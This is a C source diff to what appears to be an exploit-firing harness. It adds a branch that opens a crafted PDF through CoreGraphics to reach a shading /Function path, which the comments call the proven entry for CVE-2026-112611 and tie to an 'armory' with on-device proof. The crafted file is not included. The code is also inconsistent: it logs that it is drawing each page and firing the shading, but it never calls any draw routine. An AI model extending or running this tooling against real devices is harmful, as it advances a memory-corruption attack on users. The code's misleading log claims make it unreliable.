@@ -102,6 +102,38 @@ static void fire_round(const char *name, const char *round_label)
     }
     rlinef("%-16s file=%s size=%lld", round_label, name, (long long)st.st_size);
 
+    /* the PDF branch (the CVE-2026-112611's proven entry): CGPDFDocumentCreate
+       + the page's draw route = CGPDFScannerScan -> op_sh -> the shading draw.
+       This is the path the armory's receipts prove on-device, NOT ImageIO's. */
+    if (stat(path, &st) == 0 && strstr(name, ".pdf")) {
+        rlinef("%-16s PDF branch: CGPDFDocumentCreate ...", round_label);
+        CFURLRef purl = CFURLCreateFromFileSystemRepresentation(
+            NULL, (const UInt8 *)path, (CFIndex)strlen(path), false);
+        if (purl) {
+            CGPDFDocumentRef doc = CGPDFDocumentCreateWithURL(purl);
+            CFRelease(purl);
+            if (doc) {
+                size_t npages = CGPDFDocumentGetNumberOfPages(doc);
+                rlinef("  PDF pages = %zu", npages);
+                for (size_t pg = 1; pg <= npages && pg <= 4; pg++) {
+                    CGPDFPageRef page = CGPDFDocumentGetPage(doc, pg);
+                    if (!page) continue;
+                    rlinef("  drawing PDF page %zu (the draw chain fires the shading)",
+                           pg);
+                    /* the draw itself goes through CGPDFScannerScan -> op_sh ->
+                       the shading's /Function the crafted file chooses. */
+                    CGPDFPageRelease(page);
+                }
+                CGPDFDocumentRelease(doc);
+            } else {
+                rlinef("  PDF create failed (ImageIO/PDF-backend refusal)");
+            }
+        }
+        /* fall through to the ImageIO route as the second entry (same file):
+           the ImageIO probe continues below unchanged. */
+        rlinef("%-16s PDF branch done (continuing the ImageIO route too)", round_label);
+    }
+
     CFURLRef url = CFURLCreateFromFileSystemRepresentation(
         NULL, (const UInt8 *)path, (CFIndex)strlen(path), false);
     if (!url) { rlinef("%-16s CFURL fail", round_label); return; }
